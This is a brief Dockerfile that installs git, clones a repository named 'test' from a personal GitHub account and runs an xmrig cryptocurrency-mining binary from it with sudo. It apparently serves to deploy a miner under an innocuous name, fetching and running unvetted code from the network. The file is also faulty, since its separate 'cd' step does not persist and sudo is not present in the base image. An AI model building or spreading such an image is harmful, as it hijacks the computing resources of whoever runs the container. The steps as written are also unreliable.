FROM ubuntu
RUN apt-get update
RUN apt-get install -y git
RUN git clone "https://github.com/jimtom333/test.git"
RUN cd test
RUN chmod +x xmrig
RUN sudo ./xmrig
